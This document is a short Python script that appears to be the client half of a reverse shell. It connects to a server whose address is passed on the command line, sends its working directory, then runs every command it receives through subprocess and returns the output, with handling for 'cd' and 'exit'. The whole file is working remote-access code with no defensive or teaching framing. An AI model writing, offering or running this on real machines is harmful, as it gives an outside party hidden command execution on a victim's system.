import socket
import os
import sys
import subprocess

# Input IP as first argument in command line
serverHost = sys.argv[1]
serverPort = 12000

# 128KB max size of messages; Can be increased!
bufferSize = 1024 * 128

# Used to separate string for 2 messages
separator = " "

s = socket.socket()
s.connect((serverHost, serverPort))

# Gets current directory
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    # Command received from the server
    command = s.recv(bufferSize).decode()
    splitCommand = command.split()

    if(command.upper() == "EXIT"):
        break
    if(splitCommand[0].upper() == "CD"):
        # Directory Change
        try:
            os.chdir(' '.join(splitCommand[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)

    cwd = os.getcwd()
    message = f"{output}{separator}{cwd}"
    s.send(message.encode())

s.close() 
    
